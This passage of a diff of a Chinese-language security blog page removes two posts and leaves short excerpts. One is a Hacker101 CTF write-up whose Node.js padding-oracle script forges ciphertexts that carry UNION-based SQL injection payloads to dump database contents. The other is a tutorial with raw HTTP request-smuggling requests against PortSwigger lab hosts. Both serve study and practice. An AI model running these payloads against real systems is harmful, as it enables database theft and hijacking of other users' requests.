-<img src="/images/ctf/part6-aes-3-01.png" alt></p>
-<p>果然 QQ，原本以為還是要有 key 才能去解開，不能只單純改 id<br>
-因為原本 id 在第 7 個 block<br>
-所以改了第 6 個的 block，讓 id 所在的 block 從 3 -&gt; 1<br>
-但改了第 6 個的 block，解密出來一定會有問題<br>
-所以要先知道改了第 6 個 block 後的明文，再去回推第 5 個 block 應該要什麼值<br>
-才能讓更改後的第 6 個 block XOR 後才能解回原本應有的值<br>
-以此類推，要更改到最面的 iv block 才算完成<br>
-但全部改完之後出現下面訊息，看來跟上面直接改 id 是一樣的<br>
-看來 key 是拿去做進一層解密內容使用，所以直接改 id 不需要 key 就可以了，有點白做了 XD<br>
-<img src="/images/ctf/part6-aes-3-02.png" alt></p>
-<h2><span id="0x03">0x03</span></h2>
-<p>這一題試著把 id 改成單引號發生一件事情<br>
-<img src="/images/ctf/part6-aes-4-01.png" alt>
-SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的<br>
-至於為什麼要用 SQL Injection 的原因是因為前一個 flag 只有顯示 title，但內容因為 key 問題所以沒有顯示出來<br>
-所以只能透過 SQL Injection 去 dump 出資料庫看看有什麼可以幫助解開前一個 flag 的內容<br>
-大概是長下面的樣子，透過替換掉前面的 FLAG 達到更換 id 以及保留 key 的值<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;: &quot;9 union </span><br><span class="line">all select datab</span><br><span class="line">ase(),user()&quot;, &quot;</span><br><span class="line">aa&quot;: &quot;xxxxxxxxxx</span><br><span class="line">c6d664a03f49c08c</span><br><span class="line">$FLAG$&quot;, &quot;bb&quot;: &quot;</span><br><span class="line">3&quot;, &quot;key&quot;: &quot;rTU2</span><br><span class="line">s8qRJ4uRRdLFJbt-</span><br><span class="line">YA~~&quot;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>這樣就 dump 出 database 的資訊了(level3 以及 root@localhost 那個)<br>
-<img src="/images/ctf/part6-aes-4-02.png" alt>
-<img src="/images/ctf/part6-aes-4-03.png" alt></p>
-<p>再來 dump 出 tables<br>
-<img src="/images/ctf/part6-aes-4-04.png" alt></p>
-<p>dump 出 columns<br>
-<img src="/images/ctf/part6-aes-4-05.png" alt></p>
-<p>透過 dump 出來的 tables 和 columns，去把 tracking 列出資料來<br>
-<img src="/images/ctf/part6-aes-4-06.png" alt></p>
-<p>發現有一筆資料是對 localhost 運行的結果<br>
-把 post= 後面的值帶到瀏覽器後發現 flag4 (黑色大標是 flag3，下面小字為內容才是 flag4)<br>
-<img src="/images/ctf/part6-aes-4-07.png" alt></p>
-<p>下面整理當時寫出來的 SQL Injection 搭配 Padding Oracle 程式碼 (有點亂 XD)<br>
-程式基本邏輯為下:</p>
-<ol>
-<li>透過 padding oracle 找到原本明文</li>
-<li>透過翻轉攻擊構造假 iv 達到預期目標的明文</li>
-<li>解完最右邊那一個 block 後，繼續慢慢往左邊一次解一個 block 解下去</li>
-</ol>
-<p>要注意的地方是最外層的 for 迴圈一定要從第 9 個往下遞減跑下去<br>
-每次跑完如果 request 量太多的導致中斷連線的話<br>
-會顯示下一個要解的 block，以及下一個 payload 應該帶什麼，去防止中斷<br>
-因為這邊是直接一次 call 256 的 request 去找比較快，所以很容易斷 XD<br>
-最後面要注意的是 wantedPlainText 一定要是 16 bytes 唯一組才可以</p>
-<p>想要直接使用這個程式碼的直接改兩個大點即可</p>
-<ol>
-<li>originalPayload 的那一段 base64 改成正常 request 的 base64</li>
-<li>把 <code>http://34.74.105.127/548dbda597/?post=</code> 改成你自己的即可</li>
-</ol>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getPayload = <span class="function">(<span class="params">paddingOracleValue, paddingValue, answer</span>) =&gt;</span> &#123;</span><br><span class="line">    answer.reverse()</span><br><span class="line">    answer[paddingOracleValue] = paddingValue</span><br><span class="line">    answer.reverse()</span><br><span class="line">    <span class="keyword">return</span> answer.toString(<span class="string">'hex'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> setBlock = <span class="function">(<span class="params">allBlocks, targetBlock, paddingOracleValue, paddingValue, answer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> startPosition = targetBlock * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">const</span> previousBlockEndPosition = startPosition - <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">let</span> first = allBlocks.substring(<span class="number">0</span>, previousBlockEndPosition);</span><br><span class="line">    <span class="keyword">let</span> end = allBlocks.substring(startPosition);</span><br><span class="line">    <span class="keyword">return</span> first + getPayload(paddingOracleValue, paddingValue, answer) + end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> encodeHexToBase64 = <span class="function">(<span class="params">payload</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(payload, <span class="string">'hex'</span>).toString(<span class="string">'base64'</span>).replace(<span class="regexp">/\=/g</span>, <span class="string">'~'</span>).replace(<span class="regexp">/\//g</span>, <span class="string">"!"</span>).replace(<span class="regexp">/\+/g</span>, <span class="string">"-"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> decodeBase64ToHex = <span class="function">(<span class="params">payload</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(payload.replace(<span class="regexp">/\~/g</span>, <span class="string">'='</span>).replace(<span class="regexp">/\!/g</span>, <span class="string">"/"</span>).replace(<span class="regexp">/\-/g</span>, <span class="string">"+"</span>), <span class="string">'base64'</span>).toString(<span class="string">'hex'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>);</span><br><span class="line">    <span class="comment">// original</span></span><br><span class="line">    <span class="keyword">let</span> originalPayload = decodeBase64ToHex(<span class="string">"H6KJsPhBWKtdEt3LZnTuf8K5!-B69-TxsTNIze9!0Wrss6wGzNUKwi-aaz8WfDVnBrb2UsO7tuAhRej9F05Fexm6MihRiLDQO1vNGPdAgGZAWo11!Mw1tAdnhvdOZra3gJ99qA1adxSD!s97jVbcizRIXZ!MHVKw4jVNAplCiqzYtXJNNhxCXsJIPRKDptSLgukPWBN!wEY2e1nCQPYVrQ~~"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">let</span> block = i</span><br><span class="line">        <span class="keyword">let</span> plain = []</span><br><span class="line">        <span class="keyword">let</span> plainText = [];</span><br><span class="line">        <span class="keyword">let</span> rawPayload = originalPayload.substring(<span class="number">0</span>, (block + <span class="number">1</span>) * <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">let</span> previousIv = originalPayload.substring((block - <span class="number">1</span>) * <span class="number">32</span>, (block) * <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">let</span> answer = Buffer.from(<span class="string">"00000000000000000000000000000000"</span>, <span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> paddingOracleValue = <span class="number">0</span>; paddingOracleValue &lt; <span class="number">16</span>; paddingOracleValue++) &#123;</span><br><span class="line">            <span class="keyword">let</span> job = []</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; <span class="number">256</span>; index++) &#123;</span><br><span class="line">                <span class="keyword">let</span> paddingValue = index;</span><br><span class="line">                <span class="keyword">let</span> blocksToBeDecrypt = setBlock(rawPayload, block, paddingOracleValue, paddingValue, answer)</span><br><span class="line">                payload = encodeHexToBase64(blocksToBeDecrypt)</span><br><span class="line">                job.push(axios.get(<span class="string">`http://34.74.105.127/548dbda597/?post=<span class="subst">$&#123;payload&#125;</span>`</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> results = <span class="keyword">await</span> <span class="built_in">Promise</span>.all(job).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; results.length; index++) &#123;</span><br><span class="line">                <span class="keyword">let</span> paddingValue = index;</span><br><span class="line">                <span class="keyword">if</span> (!results[index].data.includes(<span class="string">'PaddingException'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">let</span> originalIv = Buffer.from(rawPayload, <span class="string">'hex'</span>)</span><br><span class="line">                    <span class="keyword">let</span> tempPlainText = paddingValue ^ (paddingOracleValue + <span class="number">1</span>);</span><br><span class="line">                    plainText.push(tempPlainText);</span><br><span class="line">                    plain.unshift(Buffer.from([tempPlainText ^ originalIv[(block) * <span class="number">16</span> - <span class="number">1</span> - paddingOracleValue]]).toString(<span class="string">'hex'</span>))</span><br><span class="line">                    answer.reverse()</span><br><span class="line">                    <span class="keyword">let</span> nextPaddingOracleValue = (paddingOracleValue + <span class="number">2</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; plainText.length; index++) &#123;</span><br><span class="line">                        answer[index] = plainText[index] ^ nextPaddingOracleValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    answer.reverse()</span><br><span class="line">                    <span class="built_in">console</span>.log(plain);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> wantedPlainText = [</span><br><span class="line">            <span class="string">'&#123;"id": "9 union '</span>,</span><br><span class="line">            <span class="string">'all select group'</span>,</span><br><span class="line">            <span class="string">'_concat(headers)'</span>,</span><br><span class="line">            <span class="string">' ,2 FROM trackin'</span>,</span><br><span class="line">            <span class="string">'g", "b": "bbbbbb'</span>,</span><br><span class="line">            <span class="string">'bbbbbbbbbbbbbbbb'</span>,</span><br><span class="line">            <span class="string">'bbbbbbbbbbbbbbbb'</span>,</span><br><span class="line">            <span class="string">'bbb", "bbbbbb":"'</span>,</span><br><span class="line">            <span class="string">'YA~~"&#125;\n\n\n\n\n\n\n\n\n\n'</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">const</span> originalIv = Buffer.from(previousIv, <span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">const</span> change = plain.map(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">parseInt</span>(item, <span class="number">16</span>))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'old: '</span> + Buffer.from(change).toString());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'new: '</span> + wantedPlainText[block - <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">const</span> originPlainText = Buffer.from(change)</span><br><span class="line">        <span class="keyword">const</span> wanttedPlainText = Buffer.from(wantedPlainText[block - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">const</span> wanttedIv = []</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; wanttedPlainText.length; index++) &#123;</span><br><span class="line">            wanttedIv.push(originalIv[index] ^ originPlainText[index] ^ wanttedPlainText[index])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> newIv = Buffer.from(wanttedIv).toString(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">let</span> part1 = originalPayload.substring(<span class="number">0</span>, (block - <span class="number">1</span>) * <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">let</span> part3 = originalPayload.substring((block) * <span class="number">32</span>);</span><br><span class="line">        originalPayload = <span class="string">`<span class="subst">$&#123;part1&#125;</span><span class="subst">$&#123;newIv&#125;</span><span class="subst">$&#123;part3&#125;</span>`</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`replaced block: <span class="subst">$&#123;block&#125;</span>`</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`next block: <span class="subst">$&#123;block - <span class="number">1</span>&#125;</span>`</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`new payload: <span class="subst">$&#123;encodeHexToBase64(originalPayload)&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    axios.get(<span class="string">`http://34.74.105.127/548dbda597/?post=<span class="subst">$&#123;encodeHexToBase64(originalPayload)&#125;</span>`</span>).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response.data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
-<h1><span id="後記">後記</span></h1>
-<p>這題花了我很多時間解決 XD<br>
-本來想說最後的 SQL Injection 就不要解了，反正大概知道怎麼弄<br>
-但還是很想把它解出來，所以就還是想辦法透過程式自動化去找到最後的 flag<br>
-只是過程中一直修改 wantedPlainText 再加上還會一直斷線真的是有夠麻煩 XD</p>
-
+            <h1 id="Encrypted-Pastebin"><a href="#Encrypted-Pastebin" class="headerlink" title="Encrypted Pastebin"></a>Encrypted Pastebin</h1><p>這題總共有四個 flag</p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/10/20/hacker101-part6/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -1059,158 +532,17 @@ SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的<
             
         </h1>
         <div class="content">
-            <h1><span id="什麼是-http-request-smuggling">什麼是 HTTP Request Smuggling ?</span></h1>
-<p>今日常見的網頁應用程式往往會有多一層 server 的存在<br>
-請求 --&gt; front-end server --&gt; back-end server<br>
-front-end server 接收到請求的時候，會轉發到 back-end server 去處理</p>
-<p>&lt;!-- more --&gt;</p>
-<p>http request smuglling 的漏洞就是出現在『轉發』到 back-end server 這裏<br>
-有時候為了效能關係，front-end server 到 back-end server 這一段<br>
-會把所有請求塞在同一段 TCP Connection 裡面 (重複利用 TCP Connection)，如下圖<br>
-<img src="/images/http-request-smuggling/image-01.png" alt></p>
-<p>當所有請求集中在一起轉發到 back-end server 時<br>
-如果在這之中有不合法的請求的話，會出現什麼樣的狀況呢？<br>
-此不合法的請求會被當成『下一個』請求被 back-end server 處理<br>
-這就是 HTTP Request Smuggling 攻擊
-<img src="/images/http-request-smuggling/image-02.png" alt></p>
-<h1><span id="http-request-smuggling-原理">HTTP Request Smuggling 原理</span></h1>
-<p>主要是透過 <code>Content-Length</code> 以及 <code>Transfer-Encoding</code> 此兩個標頭<br>
-可以去構造出此攻擊，這邊複習一下這兩個標頭的意義</p>
-<h2><span id="content-length">Content-Length</span></h2>
-<p><code>Content-Length</code> 指的就是用 POST Method 時帶入的 data 的長度<br>
-以此範例來說，總共為 11 bytes，那 <code>Content-Length</code> 就是 11<br>
-(此長度不含 \r\n\r\n，詳細 HTTP 組成可參考此 <a href="https://notfalse.net/39/http-message-format%5D">HTTP/1.1 — 訊息格式 Message Format)</a></p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure></p>
-<h2><span id="transfer-encoding">Transfer-Encoding</span></h2>
-<p><code>Transfer-Encoding</code> 是為了解決上一個標頭 <code>Content-Length</code> 的問題<br>
-而出現的另一個計算 message body 的方式<br>
-詳細可以參考 <a href="https://imququ.com/post/transfer-encoding-header-in-http.html">HTTP 协议中的 Transfer-Encoding</a></p>
-<p>這邊總共分為三個主體
-1. 內容長度 (16 進位)
-2. 主要內容
-3. 結束</p>
-<p>以下面的例子來說
-1. 內容長度為: b
-2. 內容為: q=smuggling
-3. 結束: 0</p>
-<blockquote>
-<p>第二點的內容是不包含 \r\n 的<br>
-除非請求本身不是 POST，需要直接結束的話<br>
-則需要把 \r\n 帶進去，且要計算長度</p>
-</blockquote>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q&#x3D;smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
-<p>而 HTTP 為了預防此兩個標頭同時使用<br>
-所以當這兩個標頭同時出現的時候，會忽略 <code>Content-Length</code> 這個標頭<br>
-再加上 front-end 和 back-end server 處理此兩個標頭的方式可能不一樣</p>
-<p>代表說當以下情況出現時
-front-end 支援 <code>Content-Length</code> 但不支援 <code>Transfer-Encoding</code><br>
-back-end  支援 <code>Content-Length</code> 支援 <code>Transfer-Encoding</code><br>
-如果我同時送了兩個標頭過去的話，front-end 就只會處理 <code>Content-Length</code> 格式的內容<br>
-而 back-end 就只會處理 <code>Transfer-Encoding</code> 格式的內容<br>
-造成不一致的現象，這造成 HTTP Request Smuggling 漏洞的問題原因之一</p>
-<p>反過來說
-front-end 支援 <code>Content-Length</code> 支援 <code>Transfer-Encoding</code><br>
-back-end  支援 <code>Content-Length</code> 但不支援 <code>Transfer-Encoding</code><br>
-也會造成不一致的現象，也是問題原因之一</p>
-<p>上面兩個例子各代表為 CL.TE vulnerabilities 以及 TE.CL vulnerabilities<br>
-CL = Content-Length<br>
-TE = Transfer-Encoding<br>
-順序代表了 front-end.back-end，簡單來說就是看誰支援什麼</p>
-<h1><span id="構造-http-request-smuggling">構造 HTTP Request Smuggling</span></h1>
-<h2><span id="clte">CL.TE</span></h2>
-<p>基本請求的概念如下<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure></p>
-<p>因為前端支援 CL，所以就先用 CL 把要偷渡的請求先放在最下面<br>
-並且用一個 0 放在前面代表著 TE 的結束符號<br>
-當請求到 back-end 的時候<br>
-POST 到 0 那一段就會是一個 reuqest<br>
-SMUGGLED 那一段就會是下一個 request</p>
-<p>這邊根據參考資料的網站去做一下實驗<br>
-因為題目說要構造出 GPOST 到 back-end 處理</p>
-<p>先試著對 front-end server 做 GPOST 得到此回應<br>
-<img src="/images/http-request-smuggling/image-03.png" alt></p>
-<p>接下來就是要把 GPOST 偷渡在 request 裡面送到 back-end<br>
-Payload 為下:<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 29</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>記得要有 \r\n 插在中間才代表 request 的結束<br>
-不然會出現 timeout 或是 invalid request 的問題<br>
-而在最後面的 GPOST 需要兩個 \r\n<br>
-這樣的 <code>Content-Length</code> 計算是需要包含 \r\n<br>
-\r 一個 byte
-\n 一個 byte</p>
-<p>所以從 0 開始那一段<br>
-0\r\n -&gt; 3 bytes<br>
-\r\n -&gt; 2 byte<br>
-GPOST /test HTTP/1.1\r\n -&gt; 22 bytes<br>
-\r\n -&gt; 2 bytes<br>
-總計為 29 bytes</p>
-<p>第一次送 request 會得到正常的請求
-<img src="/images/http-request-smuggling/image-04.png" alt></p>
-<p>第二次送，因為前一次 request 走私了一個 request<br>
-所以 response 會回應到此次 request 上<br>
-就得到 Unreconize GPOST Method 了<br>
-<img src="/images/http-request-smuggling/image-05.png" alt></p>
-<h2><span id="tecl">TE.CL</span></h2>
-<p>基本請求的概念如下<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>因為前端支援 TE，所以就先用 TE 把要偷渡的請求先放在最中間<br>
-再微調 CL 的長度，讓 back-end 只處理到 TE 的第一個主體，
-這邊要注意是 CL 的設置，長度要設置到 TE 的第一個主體結尾 (包含 \r\n)<br>
-以上面的例子來說，CL 長度要填到 8\r\n 為止 (3 bytes)<br>
-後面就放要走私的請求即可</p>
-<p>這邊根據參考資料的網站去做一下實驗<br>
-第一個要注意的點是要偷渡的 request 長度<br>
-GPOST /test HTTP/1.1\r\n -&gt; 22 bytes<br>
-\r\n -&gt; 2 bytes<br>
-24 bytes 轉成 16 進位變成 16</p>
-<p>第二個要注意的點是 CL 長度為 4<br>
-16\r\n -&gt; 4 bytes</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>第一次送 request 會得到正常的請求<br>
-<img src="/images/http-request-smuggling/image-06.png" alt></p>
-<p>第二次送，因為前一次 request 走私了一個 request<br>
-所以 response 會回應到此次 request 上<br>
-就得到 Unreconize GPOST Method 了<br>
-<img src="/images/http-request-smuggling/image-07.png" alt></p>
-<h2><span id="tete">TE.TE</span></h2>
-<p>還有一種是利用 front-end 和 back-end 對 TE 不同的解析方式去攻擊<br>
-透過帶入讓 server 混淆的 TE，可以藉此讓 server 不去解析 TE<br>
-而改去解析 CL</p>
-<p>舉例來說帶入 <code>Transfer-Encoding: cow</code><br>
-front-end server 如果把它判別成錯誤的標題，此時會轉去判斷 CL<br>
-這樣攻擊就是 CL.TE 攻擊了</p>
-<p>反過來是 back-end server 解析錯誤，改轉去判斷 CL 的話<br>
-那就是 TE.CL 攻擊了</p>
-<p>根據網站去做攻擊實驗<br>
-此實驗是 TE.CL 攻擊，代表 back-end server 針對 TE 解析有誤</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac1b1fd31f891d6c80bb2c930035000c.web-security-academy.net</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow</span><br><span class="line"></span><br><span class="line">16</span><br><span class="line">GPOST &#x2F;test HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">--- 不包含此行</span><br></pre></td></tr></table></figure></p>
-<p>byte 算法跟前面的 TE.CL 一樣</p>
-<blockquote>
-<p>如果此漏洞是 front-end server 針對 TE 有解析問題的話<br>
-Payload 和算法就要改成 CL.TE 的方式了</p>
-</blockquote>
-<p>第一次送 request 會得到正常的請求<br>
-<img src="/images/http-request-smuggling/image-08.png" alt></p>
-<p>第二次送，因為前一次 request 走私了一個 request<br>
-所以 response 會回應到此次 request 上<br>
-就得到 Unreconize GPOST Method 了<br>
-<img src="/images/http-request-smuggling/image-09.png" alt></p>
-<h1><span id="後記">後記</span></h1>
-<p>上面簡單的根據自己理解的意思<br>
-去說明了一下如何使用 HTTP Request Smuggling 攻擊<br>
-其他更詳細的可以參考下面資料，都有提供 lab 去做攻擊<br>
-而且官方寫的都非常詳細，非常建議去看看和玩玩看 lab</p>
-<h1><span id="參考資料">參考資料</span></h1>
-<ol>
-<li><a href="https://portswigger.net/web-security/request-smuggling">What is HTTP request smuggling</a></li>
-<li><a href="https://portswigger.net/web-security/request-smuggling/finding">Finding HTTP Request Smuggling</a></li>
-<li><a href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting HTTP Request Smuggling</a></li>
-<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks: Request Smuggling Reborn</a>
-此文章是作者如何繞過 PayPal 登入機制所寫的</li>
-</ol>
-
+            <h1 id="什麼是-HTTP-Request-Smuggling"><a href="#什麼是-HTTP-Request-Smuggling" class="headerlink" title="什麼是 HTTP Request Smuggling ?"></a>什麼是 HTTP Request Smuggling ?</h1><p>今日常見的網頁應用程式往往會有多一層 server 的存在<br>請求 –&gt; front-end server –&gt; back-end server<br>front-end server 接收到請求的時候，會轉發到 back-end server 去處理  </p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/30/http-smuggling/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
